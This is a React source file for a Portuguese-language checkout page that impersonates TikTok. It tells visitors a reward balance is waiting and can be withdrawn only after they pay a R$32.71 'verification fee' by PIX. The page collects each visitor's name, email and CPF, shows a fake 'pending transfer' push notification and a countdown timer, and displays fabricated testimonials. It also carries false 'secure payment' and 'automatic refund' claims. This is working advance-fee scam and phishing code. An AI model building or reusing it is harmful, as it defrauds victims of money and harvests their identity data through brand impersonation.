import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";
import { CheckCircle2, Star, Loader2, Copy, Check, Shield, Zap, CreditCard } from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import { TARGET_BALANCE } from "@/lib/constants";
import { getUtms } from "@/lib/utm";
import tiktokLogo from "@/assets/tiktok-logo.png";
import tiktokRound from "@/assets/tiktok-round.png";
import pixLogo3 from "@/assets/pix-logo-icon-3.png";
import notifIos from "@/assets/notif-ios.png";
import testimonialMatheus from "@/assets/testimonial-matheus.png";
import testimonialAna from "@/assets/testimonial-ana.png";
import testimonialCarlos from "@/assets/testimonial-carlos.png";

const TAX = 32.71;
const SALDO = TARGET_BALANCE;

const testimonials = [
{
  name: "Matheus Henrique Santos",
  text: '"rapazz e nao foi que esse ngc do bônus deu boa aqui tbm familia KKKKKK"',
  avatar: testimonialMatheus
},
{
  name: "Ana Paula Silva",
  text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"',
  avatar: testimonialAna
},
{
  name: "Carlos Eduardo",
  text: '"pensei que era golpe mas recebi na hora, top demais!!"',
  avatar: testimonialCarlos
}];


const PushNotification = ({
  show,
  exiting,
  isIOS,
  onDismiss





}: {show: boolean;exiting: boolean;isIOS: boolean;onDismiss: () => void;}) => {
  if (!show) return null;
  return (
    <div
      className="fixed z-[9999] cursor-pointer"
      onClick={onDismiss}
      style={{
        animation: exiting ?
        "notifSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards" :
        "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
        top: isIOS ? "env(safe-area-inset-top, 0px)" : "12px",
        left: isIOS ? "6px" : "12px",
        right: isIOS ? "6px" : "12px"
      }}>

      {isIOS ?
      <img
        src={notifIos}
        alt="Transferência pendente"
        className="w-full max-w-md mx-auto rounded-[22px]"
        style={{ boxShadow: "0 10px 40px rgba(0,0,0,0.15)" }}
        loading="eager"
        decoding="async" /> :


      <div
        className="rounded-2xl p-4 mx-auto max-w-md"
        style={{
          fontFamily: "'Roboto', 'Google Sans', 'Noto Sans', sans-serif",
          background: "#2a2a2e",
          boxShadow: "0 6px 24px rgba(0,0,0,0.3)"
        }}>

          <div className="flex items-center gap-2 mb-2">
            <img src={tiktokRound} alt="TikTok" className="h-4 w-4 rounded-sm object-cover shrink-0" />
            <span className="text-[11px] text-white/50 font-medium">TikTok Bônus</span>
            <span className="text-[11px] text-white/35 mx-0.5">•</span>
            <span className="text-[11px] text-white/35">agora</span>
          </div>
          <div className="flex items-start gap-3">
            <div className="flex-1 min-w-0">
              <p className="text-[14px] font-semibold text-white leading-tight mb-0.5">Transferência pendente</p>
              <p className="text-[13px] text-white/70 leading-snug">
                Transferência no valor de R$ {SALDO.toFixed(2).replace(".", ",")} aguardando pagamento da taxa de liberação.
              </p>
            </div>
            <img src={tiktokRound} alt="TikTok" className="h-10 w-10 rounded-xl object-cover shrink-0 mt-0.5" />
          </div>
        </div>
      }
    </div>);

};

const Pagamento = () => {
  useEffect(() => {
    trackTikTokEvent({ event: "AddPaymentInfo", properties: { value: TAX, currency: "BRL" } });
  }, []);

  const [email, setEmail] = useState("");
  const [nomeCompleto, setNomeCompleto] = useState("");
  const [cpf, setCpf] = useState("");
  const [loading, setLoading] = useState(false);
  const [pixData, setPixData] = useState<{
    qr_code: string;
    qr_code_base64: string;
    transaction_id: number;
  } | null>(null);
  const [copied, setCopied] = useState(false);
  const [showNotification, setShowNotification] = useState(false);
  const [exitingNotification, setExitingNotification] = useState(false);
  const [dismissNotification, setDismissNotification] = useState(false);

  const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);

  const [timeLeft, setTimeLeft] = useState(5 * 60);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft((t) => Math.max(0, t - 1)), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const minutes = String(Math.floor(timeLeft / 60)).padStart(2, "0");
  const seconds = String(timeLeft % 60).padStart(2, "0");

  const handlePagar = async () => {
    setLoading(true);
    try {
      const reference = `TK-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
      const tipoChave = localStorage.getItem("tiktok_tipo_chave") || "";
      const chavePix = localStorage.getItem("tiktok_chave_pix") || "";
      const utms = getUtms();

      const document = cpf.replace(/\D/g, "");
      const phone = tipoChave === "telefone" ? chavePix.replace(/\D/g, "") : "11999999999";

      const { data, error } = await supabase.functions.invoke("create-pix-payment", {
        body: {
          amount: Math.round(TAX * 100),
          description: "Taxa de Cadastro - TikTok Rewards",
          reference,
          source: "api_externa",
          customer: {
            name: nomeCompleto.trim(),
            email: email.trim(),
            document,
            phone
          },
          ...(Object.keys(utms).length > 0 && { metadata: utms })
        }
      });

      if (error) throw error;

      if (data?.status === "success" || data?.qr_code) {
        setPixData({
          qr_code: data.qr_code,
          qr_code_base64: data.qr_code_base64,
          transaction_id: data.transaction_id
        });
        setShowNotification(true);
        setTimeout(() => setExitingNotification(true), 5000);
        setTimeout(() => setDismissNotification(true), 5400);
        trackTikTokEvent({ event: "CompletePayment", properties: { value: TAX, currency: "BRL", transaction_id: data.transaction_id } });
      } else {
        throw new Error(data?.error || "Erro ao gerar pagamento");
      }
    } catch (err: unknown) {
      console.error("Payment error:", err);
      toast({
        title: "Erro no pagamento",
        description: err instanceof Error ? err.message : "Tente novamente em instantes.",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  const handleCopyPix = async () => {
    if (!pixData?.qr_code) return;
    await navigator.clipboard.writeText(pixData.qr_code);
    setCopied(true);
    toast({ title: "Código PIX copiado!" });
    setTimeout(() => setCopied(false), 3000);
  };

  const isFormValid = email.trim() && nomeCompleto.trim() && cpf.replace(/\D/g, "").length === 11;

  const handleDismissNotification = () => {
    setExitingNotification(true);
    setTimeout(() => setDismissNotification(true), 400);
  };

  return (
    <div className="flex min-h-screen flex-col relative" style={{ background: "#f8f8f8" }}>
      <PushNotification
        show={showNotification && !dismissNotification}
        exiting={exitingNotification}
        isIOS={isIOS}
        onDismiss={handleDismissNotification} />


      {/* TikTok-style header */}
      <div style={{ background: "#161823" }} className="px-4 py-3 flex items-center justify-between">
        <img src={tiktokLogo} alt="TikTok" className="h-6" loading="eager" decoding="async" style={{ filter: "brightness(0) invert(1)" }} />
        <div className="flex items-center gap-2">
          <div className="flex items-center gap-1.5 px-3 py-1 rounded-full" style={{ background: "rgba(255,255,255,0.1)" }}>
            <Shield className="h-3 w-3" style={{ color: "#25F4EE" }} />
            <span className="text-[11px] font-medium text-white/80">Pagamento Seguro</span>
          </div>
        </div>
      </div>

      {/* Balance strip */}
      <div className="px-4 py-3 flex items-center justify-between" style={{ background: "#fff" }}>
        <div className="flex items-center gap-3">
          <div className="h-10 w-10 rounded-xl overflow-hidden shrink-0">
            <img src={tiktokRound} alt="TikTok" className="h-full w-full object-cover" loading="eager" decoding="async" />
          </div>
          <div>
            <p className="text-[11px] font-medium" style={{ color: "#999" }}>Saldo disponível</p>
            <p className="text-lg font-bold" style={{ color: "#161823" }}>
              R$ {SALDO.toFixed(2).replace(".", ",")}
            </p>
          </div>
        </div>
        <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full" style={{ background: timeLeft <= 60 ? "#FFF0F0" : "#FFF8E1" }}>
          <div className="h-1.5 w-1.5 rounded-full animate-pulse" style={{ background: timeLeft <= 60 ? "#FE2C55" : "#FF9800" }} />
          <span className="text-[11px] font-bold tabular-nums" style={{ color: timeLeft <= 60 ? "#FE2C55" : "#FF9800" }}>
            {minutes}:{seconds}
          </span>
        </div>
      </div>

      <div className="px-4 py-4 space-y-3 max-w-lg mx-auto w-full">
        {/* Info badges row */}
        <div className="flex gap-2">
          <div className="flex-1 flex items-center gap-2 rounded-xl px-3 py-2.5" style={{ background: "#fff" }}>
            <Zap className="h-4 w-4 shrink-0" style={{ color: "#FE2C55" }} />
            <span className="text-[11px] font-medium" style={{ color: "#333" }}>Confirmação instantânea</span>
          </div>
          <div className="flex-1 flex items-center gap-2 rounded-xl px-3 py-2.5" style={{ background: "#fff" }}>
            <Shield className="h-4 w-4 shrink-0" style={{ color: "#25F4EE" }} />
            <span className="text-[11px] font-medium" style={{ color: "#333" }}>Reembolso automático</span>
          </div>
        </div>

        {/* Product summary */}
        <div className="rounded-2xl p-4" style={{ background: "#fff" }}>
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="h-11 w-11 rounded-xl flex items-center justify-center" style={{ background: "#FE2C55" }}>
                <CreditCard className="h-5 w-5 text-white" />
              </div>
              <div>
                <p className="text-[13px] font-bold" style={{ color: "#161823" }}>Taxa de Verificação</p>
                <p className="text-[11px]" style={{ color: "#999" }}>Verificação de identidade</p>
              </div>
            </div>
            <p className="text-base font-bold" style={{ color: "#161823" }}>
              R$ {TAX.toFixed(2).replace(".", ",")}
            </p>
          </div>
        </div>

        {/* Form card */}
        <div className="rounded-2xl p-4" style={{ background: "#fff" }}>
          <p className="text-[13px] font-bold mb-3" style={{ color: "#161823" }}>Seus dados</p>

          <div className="space-y-3">
            <div>
              <label className="text-[11px] font-semibold block mb-1.5" style={{ color: "#666" }}>EMAIL</label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="seuemail@exemplo.com"
                className="w-full rounded-xl px-4 py-3 text-[14px] outline-none transition-all"
                style={{
                  background: "#f5f5f5",
                  color: "#161823",
                  border: "1.5px solid transparent"
                }}
                onFocus={(e) => e.target.style.borderColor = "#FE2C55"}
                onBlur={(e) => e.target.style.borderColor = "transparent"} />

            </div>
            <div>
              <label className="text-[11px] font-semibold block mb-1.5" style={{ color: "#666" }}>NOME COMPLETO</label>
              <input
                type="text"
                value={nomeCompleto}
                onChange={(e) => setNomeCompleto(e.target.value)}
                placeholder="Nome e sobrenome"
                className="w-full rounded-xl px-4 py-3 text-[14px] outline-none transition-all"
                style={{
                  background: "#f5f5f5",
                  color: "#161823",
                  border: "1.5px solid transparent"
                }}
                onFocus={(e) => e.target.style.borderColor = "#FE2C55"}
                onBlur={(e) => e.target.style.borderColor = "transparent"} />

            </div>
            <div>
              <label className="text-[11px] font-semibold block mb-1.5" style={{ color: "#666" }}>CPF</label>
              <input
                type="text"
                inputMode="numeric"
                value={cpf}
                onChange={(e) => {
                  const digits = e.target.value.replace(/\D/g, "").slice(0, 11);
                  const formatted = digits.
                  replace(/(\d{3})(\d)/, "$1.$2").
                  replace(/(\d{3})(\d)/, "$1.$2").
                  replace(/(\d{3})(\d{1,2})$/, "$1-$2");
                  setCpf(formatted);
                }}
                placeholder="000.000.000-00"
                className="w-full rounded-xl px-4 py-3 text-[14px] outline-none transition-all"
                style={{
                  background: "#f5f5f5",
                  color: "#161823",
                  border: "1.5px solid transparent"
                }}
                onFocus={(e) => e.target.style.borderColor = "#FE2C55"}
                onBlur={(e) => e.target.style.borderColor = "transparent"} />

            </div>
          </div>
        </div>

        {/* Payment method */}
        <div className="rounded-2xl p-4" style={{ background: "#fff" }}>
          <p className="text-[13px] font-bold mb-3" style={{ color: "#161823" }}>Método de pagamento</p>
          <div
            className="flex items-center justify-between rounded-xl px-4 py-3"
            style={{ background: "#f5f5f5", border: "1.5px solid #25F4EE" }}>

            <div className="flex items-center gap-3">
              <img src={pixLogo3} alt="Pix" className="h-6 w-6" loading="eager" decoding="async" />
              <div>
                <p className="text-[13px] font-bold" style={{ color: "#161823" }}>PIX</p>
                <p className="text-[10px]" style={{ color: "#999" }}>Aprovação instantânea</p>
              </div>
            </div>
            <div className="h-5 w-5 rounded-full flex items-center justify-center" style={{ background: "#25F4EE" }}>
              
            </div>
          </div>
        </div>

        {/* CTA */}
        <button
          onClick={handlePagar}
          disabled={!isFormValid || loading || !!pixData}
          className="w-full h-[52px] rounded-2xl text-[15px] font-bold text-white tracking-wide transition-all disabled:opacity-40"
          style={{
            background: !isFormValid || loading || !!pixData ?
            "#ccc" :
            "linear-gradient(135deg, #FE2C55, #FF004F)",
            boxShadow: isFormValid && !loading && !pixData ?
            "0 4px 20px rgba(254, 44, 85, 0.4)" :
            "none"
          }}>

          {loading ?
          <span className="flex items-center justify-center gap-2">
              <Loader2 className="h-5 w-5 animate-spin" /> Gerando PIX...
            </span> :
          pixData ?
          <span className="flex items-center justify-center gap-2">
              <CheckCircle2 className="h-5 w-5" /> PIX Gerado
            </span> :

          "Liberar Saque"
          }
        </button>

        {/* QR Code result */}
        {pixData &&
        <div className="rounded-2xl p-5 text-center space-y-4" style={{ background: "#fff" }}>
            <div className="inline-flex items-center justify-center h-12 w-12 rounded-full mx-auto" style={{ background: "#E8FAF0" }}>
              <CheckCircle2 className="h-6 w-6" style={{ color: "#00C853" }} />
            </div>
            <div>
              <h2 className="text-base font-bold" style={{ color: "#161823" }}>PIX gerado com sucesso!</h2>
              <p className="text-[12px] mt-1" style={{ color: "#999" }}>Escaneie o QR Code ou copie o código</p>
            </div>

            <div className="flex justify-center p-4 rounded-xl" style={{ background: "#fafafa" }}>
              <QRCodeSVG
              value={pixData.qr_code}
              size={180}
              level="M"
              className="rounded-lg" />

            </div>

            <button
            onClick={handleCopyPix}
            className="w-full h-12 rounded-xl text-[13px] font-bold text-white transition-all flex items-center justify-center gap-2"
            style={{ background: "#161823" }}>

              {copied ?
            <>
                  <Check className="h-4 w-4" style={{ color: "#25F4EE" }} /> Copiado!
                </> :

            <>
                  <Copy className="h-4 w-4" /> Copiar Código PIX
                </>
            }
            </button>

            <p className="text-[11px]" style={{ color: "#bbb" }}>
              Confirmação automática em até 2 minutos após pagamento.
            </p>
          </div>
        }

        {/* Testimonials */}
        <div className="pt-2">
          <p className="text-[12px] font-bold mb-3" style={{ color: "#161823" }}>O que estão dizendo</p>
          <div className="flex gap-3 overflow-x-auto pb-3 -mx-4 px-4" style={{ scrollSnapType: "x mandatory" }}>
            {testimonials.map((t) =>
            <div
              key={t.name}
              className="min-w-[240px] rounded-2xl p-3.5"
              style={{ background: "#fff", scrollSnapAlign: "start" }}>

                <div className="flex items-center gap-2.5 mb-2">
                  <div className="h-8 w-8 rounded-full overflow-hidden shrink-0">
                    <img src={t.avatar} alt={t.name} className="h-full w-full object-cover" loading="eager" decoding="async" />
                  </div>
                  <div>
                    <p className="text-[12px] font-bold" style={{ color: "#161823" }}>{t.name}</p>
                    <div className="flex gap-0.5">
                      {Array.from({ length: 5 }).map((_, i) =>
                    <Star key={i} className="h-2.5 w-2.5 fill-yellow-400 text-yellow-400" />
                    )}
                    </div>
                  </div>
                </div>
                <p className="text-[11px] leading-relaxed" style={{ color: "#666" }}>{t.text}</p>
              </div>
            )}
          </div>
        </div>

        <p className="text-[10px] text-center leading-relaxed pb-4" style={{ color: "#bbb" }}>
          Ao finalizar o pagamento você concorda com os termos de uso e privacidade do TikTok.
        </p>
      </div>
    </div>);

};

export default Pagamento;